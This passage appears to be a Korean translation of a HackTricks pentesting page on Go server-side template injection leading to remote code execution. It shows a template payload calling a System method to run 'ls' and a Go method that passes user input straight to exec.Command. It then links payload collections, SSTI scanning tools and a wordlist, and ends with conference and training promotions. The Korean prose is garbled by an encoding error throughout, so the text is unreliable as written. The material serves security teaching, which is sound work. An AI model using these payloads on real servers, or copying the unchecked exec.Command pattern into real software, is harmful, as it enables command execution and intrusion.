Goì—ì„œ SSTIë¥¼ í†µí•œ RCEë¥¼ ìœ„í•´ ê°ì²´ ë©”ì„œë“œë¥¼ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´, ì œê³µëœ ê°ì²´ì— ëª…ë ¹ì„ ì‹¤í–‰í•˜ëŠ” `System` ë©”ì„œë“œê°€ ìˆëŠ” ê²½ìš°, `{{ .System "ls" }}`ì™€ ê°™ì´ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ì„œëŠ” ì¼ë°˜ì ìœ¼ë¡œ ì†ŒìŠ¤ ì½”ë“œì— ì ‘ê·¼í•´ì•¼ í•©ë‹ˆë‹¤, ì£¼ì–´ì§„ ì˜ˆì™€ ê°™ì´:
```go
func (p Person) Secret (test string) string {
out, _ := exec.Command(test).CombinedOutput()
return string(out)
}
```
**ë” ë§ì€ ì •ë³´**

* [https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to](https://blog.takemyhand.xyz/2020/06/ssti-breaking-gos-template-engine-to)
* [https://www.onsecurity.io/blog/go-ssti-method-research/](https://www.onsecurity.io/blog/go-ssti-method-research/)

### ë” ë§ì€ ìµìŠ¤í”Œë¡œì‡

ë” ë§ì€ ìµìŠ¤í”Œë¡œì‡ì€ [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)ì—ì„œ í™•ì¸í•˜ì„¸ìš”. ë˜í•œ [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)ì—ì„œ í¥ë¯¸ë¡œìš´ íƒœê·¸ ì •ë³´ë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

## BlackHat PDF

{% file src="../../.gitbook/assets/EN-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-BlackHat-15 (1).pdf" %}

## ê´€ë ¨ ë„ì›€ë§

ìœ ìš©í•  ê²ƒ ê°™ìœ¼ë©´ ì½ì–´ë³´ì„¸ìš”:

* [Flask íŠ¸ë¦­](../../network-services-pentesting/pentesting-web/flask.md)
* [Python ë§¤ì§ í•¨ìˆ˜](https://github.com/carlospolop/hacktricks/blob/master/pentesting-web/ssti-server-side-template-injection/broken-reference/README.md)

## ë„êµ¬

* [https://github.com/Hackmanit/TInjA](https://github.com/Hackmanit/TInjA)
* [https://github.com/vladko312/sstimap](https://github.com/vladko312/sstimap)
* [https://github.com/epinna/tplmap](https://github.com/epinna/tplmap)
* [https://github.com/Hackmanit/template-injection-table](https://github.com/Hackmanit/template-injection-table)

## ë¸Œë£¨íŠ¸í¬ìŠ¤ íƒì§€ ëª©ë¡

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/ssti.txt" %}

## ì—°ìŠµ ë° ì°¸ê³ ìë£Œ

* [https://portswigger.net/web-security/server-side-template-injection/exploiting](https://portswigger.net/web-security/server-side-template-injection/exploiting)
* [https://github.com/DiogoMRSilva/websitesVulnerableToSSTI](https://github.com/DiogoMRSilva/websitesVulnerableToSSTI)
* [https://portswigger.net/web-security/server-side-template-injection](https://portswigger.net/web-security/server-side-template-injection)

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

â€‹â€‹â€‹[**RootedCON**](https://www.rootedcon.com/)ì€ **ìŠ¤í˜ì¸**ì—ì„œ ê°€ì¥ ê´€ë ¨ì„±ì´ ë†’ì€ ì‚¬ì´ë²„ ë³´ì•ˆ ì´ë²¤íŠ¸ì´ë©° **ìœ ëŸ½**ì—ì„œ ê°€ì¥ ì¤‘ìš”í•œ í–‰ì‚¬ ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **ê¸°ìˆ  ì§€ì‹ì„ ì´‰ì§„í•˜ëŠ” ì„ë¬´**ë¥¼ ê°€ì§€ê³  ìˆëŠ” ì´ ì»¨ê·¸ë ˆìŠ¤ëŠ” ëª¨ë“  ë¶„ì•¼ì˜ ê¸°ìˆ  ë° ì‚¬ì´ë²„ ë³´ì•ˆ ì „ë¬¸ê°€ë“¤ì´ ëª¨ì´ëŠ” ëœ¨ê±°ìš´ ë§Œë‚¨ì˜ ì¥ì†Œì…ë‹ˆë‹¤.

{% embed url="https://www.rootedcon.com/" %}

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
